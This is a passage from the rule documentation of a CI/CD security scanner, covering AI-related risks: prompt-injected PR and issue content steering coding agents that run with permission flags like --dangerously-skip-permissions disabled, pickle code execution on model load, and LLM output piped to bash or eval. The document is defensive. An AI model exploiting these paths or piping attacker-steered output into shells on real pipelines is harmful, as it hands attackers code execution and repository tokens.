3. Move agent-config files (`CLAUDE.md`,    `.claude/`, `.cursorrules`, `.mcp.json`,    `AGENTS.md`) out of the default-checkout tree or    pin them to a committed SHA so a PR edit doesn't    reshape agent behaviour.
```

**References:**
- https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/

---

#### AI-GH-009 — AI agent runs with permission / sandbox controls disabled on a fork-triggerable event

**Severity:** CRITICAL  
**Platform:** GitHub Actions  
**OWASP:** CICD-SEC-4

A workflow invokes an AI coding agent with its permission-gating, tool-confirmation, or sandboxing controls explicitly disabled AND the workflow's trigger list includes a fork-controllable event. The flag set covered: `--dangerously-skip-permissions` (Claude Code), `bypassPermissions: true`, `autoApprove: true`, `--yolo` (Aider), `--skip-user-confirmation`, `allowed_tools: '*'` / `allowedTools: "*"` (wildcard tool access). Each of these removes the one guardrail the agent designers left in place for cases where the agent's input is attacker-shaped. Running such an agent on a `pull_request` / `pull_request_target` / `issue_comment` / `issues` event means any poisoned PR body, comment, or issue body can steer the agent's tools — `bash`, file write, `gh pr merge`, MCP server calls — with no confirmation step in between.

**Remediation:**

```
Do not disable agent safety controls on any trigger that an outside contributor can reach. Choose per-flag:

- `--dangerously-skip-permissions` → remove the flag.   If the agent needs a specific tool, add it to   `--allowedTools` by name.
- `bypassPermissions: true` / `autoApprove: true`   → set to `false` on fork-triggered jobs; keep the   auto-approve path only for scheduled / push /   workflow_dispatch runs.
- `--yolo` (Aider) → remove, and use `--yes-always`   only with a pinned diff scope.
- `allowedTools: "*"` → enumerate the specific   tools the agent actually needs.

If auto-approve is genuinely required for a use case (a maintainer-triggered release automation, say), move that workflow to `workflow_dispatch` with a protected environment so forks can't reach it.
```

**References:**
- https://docs.anthropic.com/claude-code/configuration

---

#### AI-GH-010 — Non-torch pickle-backed loader without safety flag — pickle RCE on load

**Severity:** HIGH  
**Platform:** GitHub Actions  
**OWASP:** CICD-SEC-3

A workflow calls a pickle-backed loader from a framework other than PyTorch without the framework's documented safe flag. Covered: `tf.keras.models.load_model(...)` missing `safe_mode=True`; `joblib.load(...)`; `dill.load(...)` / `dill.loads(...)`; `cloudpickle.load(...)` / `cloudpickle.loads(...)`; `numpy.load(..., allow_pickle=True)`. Every one of these invokes `pickle` under the hood and executes arbitrary Python via `__reduce__` the moment the file is parsed — exact same class as AI-GH-003 (torch.load), just in the rest of the ML stack.

**Remediation:**

```
Switch to tensor-only formats or gate the load on a scanner:

- Keras: pass `safe_mode=True` to   `keras.models.load_model` (Keras 3+) or migrate to   the `.keras` zip format that stores weights apart   from custom objects.
- `joblib.load` / `dill` / `cloudpickle`: never   load from an untrusted source in CI. Use   `safetensors` / `.npz` / `.parquet` for   artefacts that cross a trust boundary.
- `np.load`: drop `allow_pickle=True`. If you   really need object arrays, load in a sandboxed job   without secrets.

AI-GH-004 (run a pickle scanner before the load) is a complementary defence for any of these paths.
```

**References:**
- https://docs.python.org/3/library/pickle.html#restricting-globals

---

#### AI-GH-011 — MCP server loaded from a registry runner without a version pin

**Severity:** HIGH  
**Platform:** GitHub Actions  
**OWASP:** CICD-SEC-3

An MCP server config references `"command": "npx"` / `"uvx"` / `"pipx"` without a version-pinned package in its `args`. These commands fetch the latest published package every time they run, so the bytes that back the MCP server — and therefore the agent's tool implementations — change whenever the upstream publisher pushes a new release. A compromised or typo-squatted package silently rewrites the agent's tool set on the next CI run, with the agent carrying whatever scopes the workflow's GITHUB_TOKEN grants. This is the same class of supply-chain risk as unpinned `actions/*@v4` or unpinned HuggingFace revisions (AI-GH-002), applied to MCP.

**Remediation:**

```
Pin the MCP package to a specific version or a local path:

  "mcpServers": {
    "github": {
      "command": "npx",
      "args": [
        "-y",
        "@modelcontextprotocol/server-github@1.2.3"
      ]
    }
  }

Or point the MCP server at a path under the repo / a vendored bundle whose bytes you control:

  "command": "node",
  "args": ["./tools/mcp-server.js"]

For production workflows, run a private npm / PyPI mirror with image scanning and approval gating.
```

**References:**
- https://modelcontextprotocol.io/docs

---

#### AI-GH-012 — Privileged-scope MCP server loaded on a fork-triggerable event

**Severity:** HIGH  
**Platform:** GitHub Actions  
**OWASP:** CICD-SEC-4

A workflow loads an MCP server with a known-privileged tool surface — `server-filesystem` (file write), `server-github` (gh write), `server-postgres` / `server-sqlite` (SQL), `server-bash` / `server-shell` (shell exec), `server-docker` / `server-puppeteer` (container / browser control) — AND the workflow trigger list includes a fork-controllable event. MCP 'privileged' here means any primitive the agent could abuse with the workflow's token if its prompt was steered. Stacking that surface on a fork-triggerable event is the precondition for the agent-privilege-escalation path — AI-GH-005 / AI-GH-006 / AI-GH-009 describe the steering; this rule describes the tools being steered. Pair with review of `allowedTools` scoping — an MCP server loaded with a single narrow allowedTool is categorically different from the same server with wildcard scope.

**Remediation:**

```
Tighten the MCP tool surface or isolate it from fork triggers:

1. Replace wildcard MCP scope with a named-tool    allowlist. For claude-code-action:
     --allowedTools "mcp__github_inline_comment__create_inline_comment"
   (one tool, not the whole `mcp__github__` namespace).

2. Gate the MCP-enabled job on fork identity:
     if: github.event.pull_request.head.repo.full_name == github.repository

3. For the shell / filesystem / docker families    specifically, consider removing the MCP server    entirely from PR-triggered paths. Keep them on    workflow_dispatch with a protected environment if    they're needed for maintainer-triggered automation.
```

**References:**
- https://github.com/modelcontextprotocol/servers

---

#### AI-GH-013 — Agentic CLI invoked in a fork-triggerable workflow

**Severity:** HIGH  
**Platform:** GitHub Actions  
**OWASP:** CICD-SEC-4

A workflow invokes an agentic CLI directly via a `run:` step — `claude -p ...` (Claude Code), `aider` (Aider), `openhands` (OpenHands), `swe-agent` — AND the workflow trigger list includes a fork-controllable event. Same agent-in-CI threat as AI-GH-006 (action-based agents) but for the binary-invocation shape that AI-GH-006's `uses:`-anchored pattern cannot see. The agent carries the workflow's full GITHUB_TOKEN and default environment into whatever tools it decides to call, and attacker-controlled PR / issue / comment content steers those tool calls.

**Remediation:**

```
Follow the same playbook as AI-GH-006 but for the CLI shape:

1. Gate on fork identity with an `if:` clause that    compares `github.event.pull_request.head.repo.full_name` to `github.repository`.

2. Scope the CLI's tools explicitly — every agentic    CLI accepts a restrict-tools flag. For Claude    Code: `claude -p ... --allowedTools "bash:ls"`.    For Aider: `--yes-always` scoped to a pinned    diff.

3. Split the agentic step into its own workflow    triggered by `workflow_run` from a protected    branch so fork contributors cannot reach the    write-scoped token.
```

**References:**
- https://docs.anthropic.com/claude-code

---

#### AI-GL-001 — HuggingFace trust_remote_code=True executes code from the model repo (GitLab)

**Severity:** CRITICAL  
**Platform:** GitLab CI  
**OWASP:** CICD-SEC-3

A transformers / diffusers / datasets call in a GitLab CI `script:` sets `trust_remote_code=True`. The HuggingFace library then imports and executes Python shipped inside the referenced model repository — the downloaded `.py` files run inside the CI container with full access to CI/CD variables, protected masked secrets, artefacts, and the `CI_JOB_TOKEN`. A compromised or typo-squatted model repo behaves exactly like a malicious dependency install. The flag has no safe default: use an explicit model class that does not require remote code, or pin to a specific revision SHA whose code you have audited.

**Remediation:**

```
Do not opt into remote-code execution by default:

1. Drop the flag and use a built-in architecture;    `AutoModel.from_pretrained(name)` works without    `trust_remote_code` for every officially supported    architecture.

2. If the model genuinely requires remote code, pin to    a full 40-char `revision=` SHA that you have    reviewed.

3. Run untrusted-model inference in a dedicated GitLab    runner / job image with no protected variables and    no write-scoped token.
```

**References:**
- https://huggingface.co/docs/transformers/en/main_classes/model#transformers.PreTrainedModel.from_pretrained.trust_remote_code

---

#### AI-GL-002 — LLM output reaches a shell interpreter in a GitLab script

**Severity:** HIGH  
**Platform:** GitLab CI  
**OWASP:** CICD-SEC-4

A GitLab CI `script:` captures the output of an LLM call and feeds it into a shell interpreter, `eval`, or `python -c`. Patterns caught: `... | bash` / `... | sh` / `... | eval` after an `openai` / `anthropic` / `llm` / `aider` / `claude -p` / `curl api.openai.com ...` call; `eval "$(openai ...)"`. Same shape as AI-GH-007 for GitHub — the model's output becomes the next command the runner executes. If the prompt includes any attacker-controllable variable (`$CI_COMMIT_MESSAGE`, `$CI_MERGE_REQUEST_TITLE`, `$CI_MERGE_REQUEST_DESCRIPTION`), the attacker's 'suggestion' becomes shell.

**Remediation:**

```
Same as AI-GH-007: treat LLM output as attacker-shaped data. Never pipe it into a shell or `eval`. Parse structured JSON with `jq` into a strict allowlist of fields and fail closed on parse error.
```

**References:**
- https://simonwillison.net/2023/May/2/prompt-injection/

---

#### AI-GL-003 — Non-torch pickle-backed loader without safety flag (GitLab)

**Severity:** HIGH  
**Platform:** GitLab CI  
**OWASP:** CICD-SEC-3

A GitLab CI script calls a pickle-backed loader from a framework other than PyTorch without the framework's documented safe flag. Covered: `tf.keras.models.load_model(...)` missing `safe_mode=True`; `joblib.load(...)`; `dill.load(...)` / `dill.loads(...)`; `cloudpickle.load(...)` / `cloudpickle.loads(...)`; `numpy.load(..., allow_pickle=True)`. Every one of these invokes `pickle` and executes arbitrary Python via `__reduce__` the moment the file is parsed — same RCE class as AI-GL's torch sibling (not yet added), just in the rest of the ML stack.

**Remediation:**

```
Same playbook as AI-GH-010:

- Keras: pass `safe_mode=True`.
- `joblib.load` / `dill` / `cloudpickle`: don't   load untrusted artefacts in CI; switch to   `safetensors` / `.npz` / `.parquet`.
- `np.load`: drop `allow_pickle=True`.

Run a pickle scanner (`picklescan` / `modelscan` / `fickling`) before any of these in a scanning stage that gates subsequent stages.
```

**References:**
- https://docs.python.org/3/library/pickle.html#restricting-globals

---

#### AI-JK-001 — HuggingFace trust_remote_code=True executes code from the model repo (Jenkins)

**Severity:** CRITICAL  
**Platform:** Jenkins  
**OWASP:** CICD-SEC-3

A Jenkins pipeline invokes a transformers / diffusers / datasets call with `trust_remote_code=True`. The HuggingFace library imports and executes Python shipped inside the referenced model repository — the downloaded `.py` files run inside the build agent with access to the Jenkins credentials bound in `withCredentials`, the workspace, and any network reachable from the node. A compromised or typo-squatted model repo therefore behaves like a malicious package install. The flag has no safe default: use an explicit model class that does not require remote code, or pin to a specific revision SHA whose code you have audited.

**Remediation:**

```
Drop the flag and use an officially-supported architecture (`AutoModel.from_pretrained(name)`) without `trust_remote_code`. If the model genuinely requires remote code, pin to a full 40-char revision SHA you've reviewed and run the load step in a dedicated agent with no production credentials bound.
```

**References:**
- https://huggingface.co/docs/transformers/en/main_classes/model#transformers.PreTrainedModel.from_pretrained.trust_remote_code

---

#### AI-JK-002 — torch.load() without weights_only=True — pickle RCE on model load (Jenkins)

**Severity:** HIGH  
**Platform:** Jenkins  
**OWASP:** CICD-SEC-3

A Jenkins pipeline calls `torch.load(...)` without explicitly passing `weights_only=True`. PyTorch's default unpickler calls `pickle.load`, which runs arbitrary Python via `__reduce__` the moment the file is opened — no model code ever has to run. PyTorch 2.6 flipped the default to `weights_only=True`, but every Jenkinsfile that still runs on an older pinned version (and every `.ckpt` / `.pt` file from an untrusted source on any version) remains exposed. Set the flag explicitly so the safe behaviour doesn't depend on which PyTorch ends up in the agent.

**Remediation:**

```
Pass `weights_only=True` to every `torch.load` call that reads a checkpoint you didn't generate in this same pipeline run. For weights that genuinely require pickled objects, load them in a sandboxed agent with no production credentials, or switch the artefact format to `.safetensors` (tensor-only by construction).
```

**References:**
- https://pytorch.org/docs/stable/generated/torch.load.html

---

#### AI-JK-003 — LLM output reaches a shell interpreter inside a Jenkins step

**Severity:** HIGH  
**Platform:** Jenkins  
**OWASP:** CICD-SEC-4

A Jenkins pipeline pipes the output of an LLM call into `sh` / `bash` / `eval` / `python -c`, or captures it via command substitution in a GString that reaches `sh` / `bat`. Patterns caught: `openai api ... | bash` / `llm -m ... | sh`; `eval "$(openai ...)"`; `curl api.openai.com/... | jq -r .content | bash`. Same shape as AI-GH-007 / AI-GL-002 — whoever steers the model's prompt (an attacker who controls a branch name, parameter value, or SCM env var reaching the prompt) steers what the shell runs next.

**Remediation:**

```
Same as AI-GH-007: treat LLM output as attacker-shaped. Write it to a file, parse strict JSON, and validate every field before a later step consumes it. Never pipe LLM output into `sh` or `eval`.
```

**References:**
- https://simonwillison.net/2023/May/2/prompt-injection/

---

#### AI-JK-004 — Non-torch pickle-backed loader without safety flag (Jenkins)

**Severity:** HIGH  
**Platform:** Jenkins  
**OWASP:** CICD-SEC-3

A Jenkins pipeline calls a pickle-backed loader from a framework other than PyTorch without the framework's documented safe flag. Covered: `tf.keras.models.load_model(...)` missing `safe_mode=True`; `joblib.load(...)`; `dill.load(...)` / `dill.loads(...)`; `cloudpickle.load(...)` / `cloudpickle.loads(...)`; `numpy.load(..., allow_pickle=True)`. Same RCE class as AI-JK-002 (`torch.load`), different frameworks.

**Remediation:**

```
Same playbook as AI-GH-010:

- Keras: pass `safe_mode=True`.
- `joblib.load` / `dill` / `cloudpickle`:   don't load untrusted artefacts on the Jenkins   agent; switch to `safetensors` / `.npz` /   `.parquet`.
- `np.load`: drop `allow_pickle=True`.

For weights that genuinely need pickle, load in a dedicated agent that has no production credentials bound.
```

**References:**
- https://docs.python.org/3/library/pickle.html#restricting-globals

---

---

## Adding New Rules

Rules are declarative data structures in `taintly/rules/github/`, `taintly/rules/gitlab/`, or `taintly/rules/jenkins/`. Any `.py` file in those directories with a `RULES` list is automatically discovered.

```python
from taintly.models import Rule, Severity, Platform, RegexPattern

RULES = [
    Rule(
        id="SEC1-GH-001",
        title="Example rule",
        severity=Severity.HIGH,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-1",
        description="What this detects and why it's dangerous.",
        pattern=RegexPattern(
            match=r"dangerous_pattern",
            exclude=[r"^\s*#"],
        ),
        remediation="How to fix it.",
        reference="https://reference.link/",
        test_positive=["line that should trigger"],
        test_negative=["line that should not trigger"],
    ),
]
```

Run `python -m taintly --self-test --rule SEC1-GH-001` to validate.
